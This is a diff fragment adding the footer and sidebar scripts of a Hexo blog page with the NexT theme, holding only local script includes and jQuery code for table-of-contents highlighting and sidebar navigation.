+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">GeneBlue</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js" id="motion.global"></script>
+
+
+
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+
+  
+  
+  
+
+  
+
+
+
+
+  
+  
+
+</body>
+</html>
